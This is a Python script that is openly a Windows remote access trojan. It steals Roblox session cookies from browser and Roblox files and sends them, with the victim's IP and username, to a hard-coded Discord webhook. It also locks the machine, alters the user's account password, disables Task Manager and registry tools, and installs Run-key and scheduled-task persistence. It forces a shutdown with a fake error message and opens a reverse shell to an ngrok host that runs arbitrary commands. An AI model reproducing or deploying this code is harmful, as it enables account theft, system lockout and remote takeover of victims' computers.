import requests
import os
import subprocess
import time
import getpass
import json
import base64
import socket
import winreg
import ctypes
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1515403503433158666/jYHJixb8IwqCxKmqsJ8bsFMgfTNjPSIQ1AsbAfxmxv-BmzpEq9WQjPlmJiNRRYQtpn3q"

def steal_roblox_cookies():
    cookies_found = []
    cookie_paths = [
        os.path.expanduser("~") + r"\AppData\Local\Roblox\Cookies",
        os.path.expanduser("~") + r"\AppData\Roaming\Roblox\Cookies",
        os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies",
        os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
    ]
    for path in cookie_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    data = f.read()
                    if ".ROBLOSECURITY" in data:
                        cookies_found.append(data)
            except:
                pass
    if cookies_found:
        return base64.b64encode("\n---\n".join(cookies_found).encode()).decode()
    return "Tm8gUm9ibG94IGNvb2tpZXMgZm91bmQ="

def lock_system():
    ctypes.windll.user32.LockWorkStation()
    os.system(f'net user {getpass.getuser()} * /add 2>nul')
    os.system(f'net user {getpass.getuser()} *')
    os.system('net accounts /forcelogoff:1')
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        handle = winreg.CreateKey(key, subkey)
        winreg.SetValueEx(handle, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(handle, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(handle)
    except:
        pass

def force_shutdown(delay=10):
    os.system(f'shutdown /s /f /t {delay} /c "System error. Contact administrator."')

def add_persistence():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        current_file = os.path.abspath(__file__)
        winreg.SetValueEx(handle, "SystemHelper", 0, winreg.REG_SZ, current_file)
        winreg.CloseKey(handle)
    except:
        pass
    try:
        os.system(f'schtasks /create /tn "SystemCheck" /tr "{os.path.abspath(__file__)}" /sc onlogon /f')
    except:
        pass

def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown IP"

def send_to_discord(cookie_data, victim_ip, username, lock_status):
    payload = {
        "username": "RAT_System",
        "content": f"**Victim:** {username}\n**IP:** {victim_ip}\n**Lock Status:** {lock_status}\n**Cookies (Base64):**```{cookie_data[:1500]}```",
        "tts": False
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass
    try:
        with open("cookie_dump.txt", "w") as f:
            f.write(base64.b64decode(cookie_data).decode())
        with open("cookie_dump.txt", "rb") as f:
            files = {"file": ("cookies.txt", f, "text/plain")}
            requests.post(WEBHOOK_URL, files=files, timeout=10)
        os.remove("cookie_dump.txt")
    except:
        pass

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("0.tcp.ngrok.io", 12345))
        while True:
            cmd = s.recv(1024).decode()
            if cmd == "unlock":
                os.system(f'net user {getpass.getuser()} /active:yes')
                os.system('shutdown /a')
                try:
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
                    handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(handle, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(handle, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
                    winreg.CloseKey(handle)
                except:
                    pass
                s.send(b"unlocked")
                break
            elif cmd == "shutdown":
                force_shutdown(0)
            else:
                output = os.popen(cmd).read()
                s.send(output.encode())
        s.close()
    except:
        pass

def main():
    try:
        add_persistence()
        cookies = steal_roblox_cookies()
        ip = get_ip()
        username = getpass.getuser()
        lock_system()
        time.sleep(2)
        send_to_discord(cookies, ip, username, "LOCKED")
        time.sleep(5)
        force_shutdown(10)
    except:
        pass
    try:
        import threading
        threading.Thread(target=reverse_shell, daemon=True).start()
    except:
        pass

if __name__ == "__main__":
    main()